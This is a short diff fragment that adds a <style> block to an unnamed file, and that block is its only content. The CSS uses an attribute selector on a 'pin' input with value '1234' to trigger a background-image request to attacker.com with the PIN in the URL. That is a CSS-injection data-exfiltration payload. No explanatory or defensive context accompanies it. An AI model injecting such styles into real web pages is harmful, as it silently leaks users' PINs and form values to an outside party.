@@ -1,0 +1,5 @@
+<style>
+   input[name="pin"][value="1234"] {
+      background: url(https://attacker.com/log?pin=1234);
+   }
+</style>
